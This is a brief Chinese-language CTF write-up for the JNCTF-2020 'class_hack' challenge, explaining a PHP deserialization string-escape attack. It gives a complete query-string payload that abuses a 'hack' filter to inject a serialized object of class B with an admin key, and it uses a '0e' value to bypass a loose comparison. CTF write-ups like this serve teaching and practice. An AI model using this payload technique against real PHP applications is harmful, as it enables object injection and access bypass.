# JNCTF-2020 : class_hack

### 考察点：

​	反序列化逃逸

### Payload:

​	?a=HackHackHackHack&b=";s:1:"b";O:1:"B":2:{s:3:"key";s:5:"admin";s:4:"xnum";s:8:"0e123456";}}

### 思路：

​	利用filter函数将hack字符串过滤掉的功能进行序列化字符串的逃逸，构造出B类型的序列化字符串，能够进入B类的__destruct()方法，利用科学记数法绕过if中的判断条件。

